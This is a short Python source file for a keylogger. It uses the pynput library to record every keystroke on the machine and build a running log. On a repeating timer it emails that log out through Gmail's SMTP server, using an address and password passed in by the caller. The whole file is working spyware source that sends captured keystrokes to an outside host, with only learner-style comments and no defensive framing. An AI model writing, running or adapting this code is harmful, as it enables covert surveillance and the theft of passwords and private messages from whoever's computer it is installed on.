import pynput
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append(self, string):
        self.log += string

    def key_press(self, key):
        # global log   #log is outside the function so use global
        try:
            # log+=str(key.char)  # so that it doesn't come up with 'a' 'b' 'c' like that but with abc
            current_key = str(key.char)
        except AttributeError:  #space gives an error without this
            if key==key.space:
                # log+=" "         #To replace key.space with " "
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append(current_key)
        # print(log)

    def report(self):
        if self.log!="":
            self.sendmail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report) #Threading will help to run code without depending on other code.
        timer.start()

    def sendmail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

